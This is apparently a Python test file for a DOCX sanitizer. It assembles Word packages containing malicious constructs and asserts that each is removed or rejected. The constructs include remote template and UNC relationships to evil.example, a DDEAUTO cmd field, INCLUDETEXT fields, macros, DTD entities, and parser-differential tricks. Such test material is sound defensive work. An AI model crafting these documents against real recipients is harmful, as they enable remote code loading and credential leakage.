"""Self-check for sanitize_docx: run with the worker's Python from the worker folder: python test_sanitize.py"""
import io
import zipfile
from pathlib import Path

from fastapi import HTTPException

from app import sanitize_docx

R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
STRICT = 'xmlns:w="http://purl.oclc.org/ooxml/wordprocessingml/main"'
TYPES = (
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/>{}</Types>'
)
RELS = (
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    f'<Relationship Id="rId1" Type="{R}/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>'
    f"<Relationship Id='rId4' Type='{R}/oleObject' Target='https://evil.example/single' TargetMode='External'/>"
    f'<Relationship Id="rId5" Type="{R}/image" Target="https://evil.example/spaced" TargetMode = " external "></Relationship>'
    f'<Relationship Id="rId6" Type="{R}/hyperlink" Target="file://evil.example/share/x" TargetMode="External"/>'
    f'<Relationship Id="rId7" Type="{R}/frame" Target="\\\\evil.example\\share\\x.docx"/>'
    f'<Relationship Id="rId2" Type="{R}/hyperlink" Target="https://example.com" TargetMode="External"/>'
    f'<Relationship Id="rId3" Type="{R}/styles" Target="styles.xml"/>'
    "</Relationships>"
)


def pkg(files, overrides=""):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, body in {"[Content_Types].xml": TYPES.format(overrides), **files}.items():
            z.writestr(name, body)
    return buf.getvalue()


def rejected(files, overrides=""):
    try:
        sanitize_docx(pkg(files, overrides))
        return False
    except HTTPException as e:
        assert e.status_code == 415
        return True


def doc(body, ns=W):
    return f"<w:document {ns}><w:body><w:p>{body}</w:p></w:body></w:document>"


def field(*instr):
    runs = "".join(f"<w:r><w:instrText>{i}</w:instrText></w:r>" for i in instr)
    return f'<w:r><w:fldChar w:fldCharType="begin"/></w:r>{runs}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>1</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'


def rels(*entries):
    body = "".join(f'<Relationship Id="rId{i}" Type="{R}/{t}" Target="{target}"/>' for i, (t, target) in enumerate(entries))
    return f'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{body}</Relationships>'


# Relationship cleaning keeps internal parts and web/mail hyperlinks only.
STYLES = {"word/styles.xml": f"<w:styles {W}/>"}
clean = zipfile.ZipFile(io.BytesIO(sanitize_docx(pkg({"word/_rels/settings.xml.rels": RELS, **STYLES}))))
out = clean.read("word/_rels/settings.xml.rels").decode()
assert "evil.example" not in out, "external, file: and UNC targets are removed however they are written"
assert "https://example.com" in out and 'Target="styles.xml"' in out, "hyperlinks and internal parts are kept"

# Ordinary content passes.
assert not rejected({"word/document.xml": doc('<w:r><w:t>Plain text</w:t></w:r>' + field(" PAGE "))}), "PAGE field passes"
assert not rejected({"word/document.xml": doc(field(" IF ", " = 1 "))}), "formula and IF pass"
assert not rejected({"word/media/image1.png": b"\x89PNG"}), "images pass"

# Remote-loading or executing fields, wherever and however they are written.
assert rejected({"word/document.xml": doc(field(" INCLUDE", 'PICTURE "\\\\evil\\x.png" '))}), "field split across runs"
assert rejected({"word/document.xml": doc(field(" INCLUDEPICTURE x"), ns=STRICT)}), "Strict namespace"
nested = '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> IF 1 = 1 "</w:instrText></w:r>' + field(" INCLUDETEXT x ") + '<w:r><w:instrText>"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'
assert rejected({"word/document.xml": doc(nested)}), "nested field"
assert rejected({"word/document.xml": doc(field(" QUOTE x "))}), "QUOTE"
assert rejected({"word/header1.xml": f'<w:hdr {W}><w:fldSimple w:instr="DDEAUTO cmd x"/></w:hdr>'}), "DDE simple field"
assert rejected({"word/document.xml": doc('<w:r><w:fldData>AAAA</w:fldData></w:r>')}), "fldData"
assert rejected({"word/settings.xml": f"<w:settings {W}><w:mailMerge/></w:settings>"}), "mail merge"

# Content types decide, not file names.
bin_part = '<Override PartName="/word/document.bin" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
assert rejected({"word/document.bin": doc(field(" INCLUDETEXT x "))}, bin_part), "mis-named document part"
assert rejected({"word/import.html": "<html></html>"}, '<Default Extension="html" ContentType="text/html"/>'), "HTML part"
assert rejected({"word/_rels/document.xml.rels": rels(("aFChunk", "import.xml"))}), "altChunk relationship"
assert rejected({"word/_rels/document.xml.rels": rels(("oleObject", "embeddings/x.bin"))}), "embedded object"

# Parser differentials: Word reads exact attribute names and WordprocessingML elements only.
shadow = (
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships" xmlns:x="urn:x">'
    f'<Relationship Id="rId1" x:Type="{R}/styles" Type="{R}/oleObject" Target="embeddings/x.bin"/></Relationships>'
)
assert rejected({"word/_rels/document.xml.rels": shadow}), "foreign-namespace Type cannot hide the real one"
shadow_ext = shadow.replace('Target="embeddings/x.bin"', 'Target="https://evil.example/t" TargetMode="External" x:TargetMode="Internal"')
assert "evil" not in zipfile.ZipFile(io.BytesIO(sanitize_docx(pkg({"word/_rels/document.xml.rels": shadow_ext})))).read("word/_rels/document.xml.rels").decode()
assert rejected({"word/document.xml": doc('<w:r><x:instrText xmlns:x="urn:x">PAGE</x:instrText></w:r>')}), "look-alike field markup"
assert rejected({"word/document.xml": doc(field())}), "empty field instruction"
after_sep = field(" PAGE ").replace('<w:r><w:t>1</w:t></w:r>', '<w:r><w:instrText> INCLUDETEXT x</w:instrText></w:r>')
assert rejected({"word/document.xml": doc(after_sep)}), "instruction text after the separator"
from_nested = '<w:r><w:fldChar w:fldCharType="begin"/></w:r>' + field(" REF bm ") + '<w:r><w:instrText> PAGE</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'
assert rejected({"word/document.xml": doc(from_nested)}), "keyword produced by a nested field"
ok_nested = '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> IF 1 = 1 "</w:instrText></w:r>' + field(" PAGE ") + '<w:r><w:instrText>"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'
assert not rejected({"word/document.xml": doc(ok_nested)}), "nested allowlisted fields pass"
assert rejected({"word/media/x.png": doc(field(" INCLUDETEXT x "))}), "XML declared as an image is still checked"
assert rejected({"word/_rels/document.xml.rels": rels(("header", "media/x.png")), "word/media/x.png": b"\x89PNG"}), "header must be XML"
assert rejected({"word/media/x.svg": "<svg/>"}, '<Default Extension="svg" ContentType="image/svg+xml"/>'), "SVG"
pict = '<w:r><w:pict xmlns:o="urn:schemas-microsoft-com:office:office"><o:x o:val="{}"/></w:pict></w:r>'
for path in ["file:///C:/secret.png", "C:\\secret.png", " \\\\evil\\x", "/\\evil\\x", "%5C%5Cevil%5Cx", "fi le:///x"]:
    assert rejected({"word/document.xml": doc(pict.format(path))}), f"path attribute {path!r}"
assert not rejected({"word/document.xml": doc(pict.format("12:30"))}), "ordinary values pass"
href = '<w:r><w:pict xmlns:o="urn:schemas-microsoft-com:office:office"><o:x o:href="https://evil.example/x.png"/></w:pict></w:r>'
assert rejected({"word/document.xml": doc(href)}), "linked-picture URL attribute"
for attr in ['o:althref="x.png"', 'o:val="https://evil.example/x"', 'o:val="mhtml:https://evil/x!y"', 'o:uri="https://evil.example/x"']:
    assert rejected({"word/document.xml": doc(pict.replace('o:val="{}"', attr))}), f"URL-like attribute {attr}"
graphic = '<w:r><a:graphicData xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" uri="http://schemas.openxmlformats.org/drawingml/2006/picture"/></w:r>'
assert not rejected({"word/document.xml": doc(graphic)}), "schema uri on pictures passes"

# Relationship targets fail closed and must be written plainly.
assert rejected({"word/_rels/document.xml.rels": rels(("styles", "missing.xml"))}), "missing target part"
assert rejected({"word/_rels/document.xml.rels": rels(("styles", "style%73.xml")), **STYLES}), "encoded target"
assert rejected({"word/_rels/document.xml.rels": rels(("styles", "..\\word\\styles.xml")), **STYLES}), "backslashed target"
assert not rejected({"word/_rels/document.xml.rels": rels(("styles", "styles.xml")), **STYLES}), "plain target passes"
mixed = rels(("attachedTemplate", "/\\evil\\t.dotm"))
assert "evil" not in zipfile.ZipFile(io.BytesIO(sanitize_docx(pkg({"word/_rels/settings.xml.rels": mixed})))).read("word/_rels/settings.xml.rels").decode()

# Part names Word and the check could read differently.
assert rejected({"word/doc%75ment.xml": doc("")}), "encoded part name"
assert rejected({"word/document.xml": doc(""), "WORD/DOCUMENT.XML": doc("")}), "case-insensitive duplicate"
assert rejected({"word/../document.xml": doc("")}), "dot-dot segment"

# Parser and package checks.
dtd = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "aaaa">]><r>&a;</r>'
assert rejected({"word/document.xml": dtd}), "DTD in UTF-8"
assert rejected({"word/document.xml": dtd.replace('version="1.0"', 'version="1.0" encoding="UTF-16"').encode("utf-16")}), "DTD in UTF-16"
assert rejected({"word/_rels/document.xml.rels": "<Relationships"}), "unparseable .rels"
macro = '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
assert rejected({"word/document.xml": doc("")}, macro), "macros"

# The synthetic demo files (generated and Word-saved, if present) pass unchanged in substance.
for path in ["../public/demo/demo-agreement-v1.docx", "../public/demo/demo-agreement-v2.docx"]:
    sanitize_docx(Path(path).read_bytes())

print("sanitize_docx ok")
